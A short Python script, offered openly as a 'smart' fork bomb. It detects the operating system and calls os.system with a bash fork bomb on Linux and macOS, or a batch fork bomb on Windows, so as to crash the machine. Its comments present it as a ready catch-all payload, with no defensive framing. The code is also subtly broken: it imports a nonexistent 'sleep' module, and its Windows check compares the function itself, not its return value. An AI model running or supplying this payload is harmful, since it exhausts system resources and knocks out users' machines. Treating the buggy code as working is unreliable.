"""

Made by: Cypress

A 'smart' fork bomb, detects the OS and executes a fork bomb based on the system
Purpose: Way easier than trying to find the right payload, this is a catch-all and will do the work for you

"""

import platform, os, sleep

def get_platform():
    if platform.system() == 'Linux':
        return 1
    elif platform.system() == 'Windows':
        return 2
    elif platform.system() == 'Darwin':
        return 3

def crash_windows():
    os.system("%0|%0")

def crash_linux():
    os.system(":(){ :|: & };:")

def crash_mac():
    os.system(":(){ :|: & };:") #the same thing as linux because you can run bash commands on mac

if get_platform() == 1:
    crash_linux()
elif get_platform == 2:
    crash_windows()
else:
    crash_mac()

